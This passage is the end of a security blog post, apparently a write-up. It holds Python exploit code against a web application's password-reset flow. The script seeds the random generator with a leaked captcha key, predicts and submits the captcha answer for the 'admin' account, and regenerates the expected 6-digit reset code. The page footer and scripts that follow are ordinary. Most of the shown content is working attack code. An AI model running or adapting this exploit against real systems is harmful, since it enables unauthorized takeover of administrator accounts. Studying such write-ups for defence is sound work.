</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> length <span style="color:#f92672">&gt;=</span> args_true_count, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Expected length &gt;= </span><span style="color:#e6db74">{</span>args_true_count<span style="color:#e6db74">}</span><span style="color:#e6db74">, bug got </span><span style="color:#e6db74">{</span>length<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    can_startswith_special_char <span style="color:#f92672">=</span> args_true_count <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> special_char
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([args_string_map[k] <span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> kwargs<span style="color:#f92672">.</span>items() <span style="color:#66d9ef">if</span> v])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> list(random<span style="color:#f92672">.</span>choice(chars) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(length))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> kwargs<span style="color:#f92672">.</span>items():
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> v <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> (set(password) <span style="color:#f92672">&amp;</span> set(args_string_map[k])):
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 没有包含指定的字符, retry</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> can_startswith_special_char <span style="color:#f92672">and</span> password[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">in</span> args_string_map[<span style="color:#e6db74">&#39;special_char&#39;</span>]:
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 首位不能为特殊字符, retry</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 满足要求终止 while 循环</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(password)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> password
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_seed</span>(s : requests<span style="color:#f92672">.</span>Session):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[*] start set seed&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> key <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/core/auth/password/forget/previewing/&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\/core\/auth\/captcha\/image\/([a-f0-9]</span><span style="color:#e6db74">{40}</span><span style="color:#e6db74">)\/&#39;</span>
</span></span><span style="display:flex;"><span>            key <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(pattern, res<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;[-] get key failed&#39;</span>)
</span></span><span style="display:flex;"><span>            print(res<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>            exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(key) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">40</span> :
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;[-] key error&#39;</span>)
</span></span><span style="display:flex;"><span>            exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
</span></span><span style="display:flex;"><span>            res <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/core/auth/captcha/image/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/&#39;</span><span style="color:#f92672">.</span>format(key))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_reset_page_1</span>(s : requests<span style="color:#f92672">.</span>Session) <span style="color:#f92672">-&gt;</span> tuple[str, str]:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] start to get captcha0&#34;</span>)
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/core/auth/password/forget/previewing/&#39;</span>)
</span></span><span style="display:flex;"><span>    key_pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\/core\/auth\/captcha\/image\/([a-f0-9]</span><span style="color:#e6db74">{40}</span><span style="color:#e6db74">)\/&#39;</span>
</span></span><span style="display:flex;"><span>    csrf_token_pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;name=&#34;csrfmiddlewaretoken&#34; value=&#34;(.*)&#34;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        key <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(key_pattern, res<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>        csrf_token <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(csrf_token_pattern, res<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(key) <span style="color:#f92672">==</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">and</span> len(csrf_token) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;[+] get captcha0 success&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (key, csrf_token)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        print(e)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[-] get captcha0 failed&#34;</span>)
</span></span><span style="display:flex;"><span>    exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_captcha</span>(s : requests<span style="color:#f92672">.</span>Session, captcha_0 : str, captcha_1 : str, csrf_token : str) <span style="color:#f92672">-&gt;</span> str:
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;csrfmiddlewaretoken&#34;</span> : csrf_token,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;username&#34;</span> : <span style="color:#e6db74">&#34;admin&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;captcha_0&#34;</span> : captcha_0,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;captcha_1&#34;</span> : captcha_1
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span>  s<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/core/auth/password/forget/previewing/&#39;</span>, data<span style="color:#f92672">=</span>data, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> res<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">302</span>:
</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;Location&#34;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;token=&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(token) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> token
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        key <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        set_seed(s)        <span style="color:#75715e"># set seed + gen_img_flow</span>
</span></span><span style="display:flex;"><span>        captcha0_key, captcha0_csrf_token <span style="color:#f92672">=</span> get_reset_page_1(s)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        random<span style="color:#f92672">.</span>seed(key)
</span></span><span style="display:flex;"><span>        gen_img_flow(<span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>        chal, answer <span style="color:#f92672">=</span> math_challenge()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> send_captcha(s, captcha0_key, str(answer), captcha0_csrf_token)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> token <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;captcha incorrect&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> captcha0_key
</span></span><span style="display:flex;"><span>    set_seed(s)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>seed(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    CAPTCHA_LETTER_ROTATION <span style="color:#f92672">=</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">35</span>)
</span></span><span style="display:flex;"><span>    charlist <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> chal:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> char <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#f92672">and</span> len(charlist) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            charlist[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+=</span> char
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            charlist<span style="color:#f92672">.</span>append(char)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>        random<span style="color:#f92672">.</span>randrange(<span style="color:#f92672">*</span>CAPTCHA_LETTER_ROTATION)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    gen_img_flow(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> random_string(<span style="color:#ae81ff">6</span>, lower<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, upper<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>    print(code)
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://zoiltin.github.io/">zoiltin&#39;s Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
